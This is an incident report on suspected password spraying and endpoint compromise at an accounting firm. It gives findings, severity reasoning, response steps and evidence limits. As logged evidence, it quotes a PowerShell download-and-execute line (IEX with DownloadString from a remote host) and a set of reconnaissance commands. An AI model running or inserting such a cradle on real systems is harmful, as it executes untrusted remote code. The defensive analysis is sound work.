# Incident Report — INC-005

## Executive Summary

Redgum Accounting Pty Ltd reported unusual Windows authentication activity involving multiple employee accounts.

Initial authentication telemetry showed repeated failed logon attempts originating from `192.168.1.44`. Correlation with domain-controller events showed that the source attempted authentication against multiple accounts within a short timeframe, consistent with password spraying.

A successful authentication to `REDGUM\r.brown` subsequently occurred from the same source.

The source IP was identified as `RG-LAPTOP-12`, a company laptop assigned to John Smith. John confirmed he was not using the laptop during the relevant period.

Further endpoint telemetry showed PowerShell execution followed by retrieval of a remote PowerShell script from `10.10.20.15`. The retrieved content was passed to `Invoke-Expression` (`IEX`), indicating execution of dynamically retrieved PowerShell content.

Follow-on commands performed process, service, and security-context discovery.

Based on the supplied evidence, the incident is classified as **High severity** and requires immediate containment and further investigation.

---

## Incident Classification

| Field                                    | Assessment                                        |
| ---------------------------------------- | ------------------------------------------------- |
| Incident ID                              | INC-005                                           |
| Incident Type                            | Credential Attack / Suspected Endpoint Compromise |
| Severity                                 | **High**                                          |
| Primary Attack                           | Password Spraying                                 |
| Affected Endpoint                        | `RG-LAPTOP-12`                                    |
| Assigned User                            | John Smith                                        |
| Source IP                                | `192.168.1.44`                                    |
| Remote Script Host                       | `10.10.20.15`                                     |
| Affected Account Requiring Investigation | `REDGUM\r.brown`                                  |
| Confirmed Malware                        | Not established                                   |
| Confirmed Persistence                    | Not established                                   |
| Confirmed Privilege Escalation           | Not established                                   |
| Confirmed Lateral Movement               | Not established                                   |
| Confirmed Data Exfiltration              | Not established                                   |

---

## Key Findings

### Finding 1 — Password Spraying

Multiple user accounts were targeted from `192.168.1.44` within seconds.

The activity pattern is more consistent with password spraying than repeated password guessing against a single account.

### Finding 2 — Successful Authentication

A successful authentication to `REDGUM\r.brown` occurred following the failed authentication activity.

This requires investigation to determine whether the credential was compromised or legitimately used.

### Finding 3 — Endpoint Attribution

`192.168.1.44` was identified as `RG-LAPTOP-12`.

The laptop was assigned to John Smith.

John confirmed he was not operating the laptop during the relevant activity window.

### Finding 4 — PowerShell Remote Retrieval and Execution

PowerShell Script Block Logging recorded:

```powershell
$u = "http://10.10.20.15/update.ps1"
IEX (New-Object Net.WebClient).DownloadString($u)
```

The evidence indicates that PowerShell retrieved remote content and passed the resulting string to `Invoke-Expression` for execution.

The actual contents and intent of `update.ps1` have not been provided and therefore cannot be independently classified as malware from this evidence alone.

### Finding 5 — Post-Execution Reconnaissance

Subsequent commands included:

```powershell
Get-Process
Get-Service
whoami /all
```

These commands are consistent with process, service, and security-context discovery.

---

## Severity Rationale

### HIGH

The combination of:

* password spraying;
* successful authentication;
* suspected endpoint compromise;
* remote PowerShell script retrieval;
* dynamic PowerShell execution;
* post-execution reconnaissance

creates a credible risk of active compromise.

The incident is not currently classified as Critical because the available evidence does not establish privileged compromise, persistence, lateral movement, data exfiltration, ransomware, or widespread organisational impact.

### Critical Escalation Triggers

Escalate to Critical if additional investigation confirms:

* privileged account compromise;
* persistence;
* lateral movement;
* confirmed malware;
* sensitive data access/exfiltration;
* multiple compromised hosts;
* material business impact.

---

## Immediate Response

1. Isolate `RG-LAPTOP-12`.
2. Preserve endpoint evidence before reimaging or wiping.
3. Investigate and protect the `r.brown` credential.
4. Review all accounts targeted during the password-spraying activity.
5. Identify and investigate `10.10.20.15`.
6. Preserve PowerShell and Windows authentication logs.
7. Retrieve and safely analyse `update.ps1`.
8. Search for the same indicators across other endpoints.
9. Review authentication and endpoint telemetry for lateral movement.
10. Escalate severity if additional compromise is confirmed.

---

## Evidence Limitations

The supplied evidence does not establish:

* attacker identity;
* credential acquisition method;
* exact script contents;
* persistence;
* privilege escalation;
* lateral movement;
* data access;
* data exfiltration;
* malicious ownership of `10.10.20.15`.

These remain investigation priorities.

---

## Analyst Conclusion

The evidence supports a **High-severity security incident involving password spraying and probable endpoint compromise**.

The strongest evidence of escalation is the combination of successful authentication and PowerShell retrieving and executing remote content.

The endpoint should be contained immediately while preserving evidence for further forensic investigation.
